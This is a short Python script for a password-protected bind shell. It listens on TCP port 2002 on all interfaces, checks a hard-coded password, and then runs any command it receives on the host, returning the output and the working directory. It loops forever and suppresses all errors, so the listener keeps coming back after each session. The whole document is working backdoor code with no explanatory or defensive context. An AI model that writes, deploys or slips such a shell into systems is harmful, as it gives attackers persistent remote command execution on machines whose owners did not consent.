while True:
    try:
        import socket as s,subprocess as sp,os
        #creatin socket 
        BUFFER_SIZE = 1024 * 128
        s1=s.socket(s.AF_INET,s.SOCK_STREAM)
        s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1)
        s1.bind(("0.0.0.0",2002))
        s1.listen(1)
        c,a=s1.accept()
        #asking for authentication
        c.send((f"auth").encode())
        #if entered password is correct
        if (c.recv(BUFFER_SIZE).decode()) == "open@bind":
            c.send((f"{os.getcwd()}").encode())
            while True: 
                d=c.recv(BUFFER_SIZE).decode()
                #if wanna exit
                if d == "exit":
                    c.send((f"{os.getcwd()}"+"<sep>"+"exiting...").encode())
                    c.close() 
                    break  
                elif d.split()[0] == "cd":
                    # cd command, change directory
                    try:
                        os.chdir(' '.join(d.split()[1:]))
                        output = " "
                    except FileNotFoundError as e:
                        # if there is an error, set as the output
                        output = "File Not Found"  
                    except:
                        pass    
                else:
                    output = str(sp.getoutput(d))
                cwd = os.getcwd()
                p=f"{cwd}"+"<sep>"+output
                c.send(p.encode())
        #if entered password is not correct        
        else:
            c.send((f"denied").encode())            
        c.close() 
        s1.close()   
    except:
        pass        
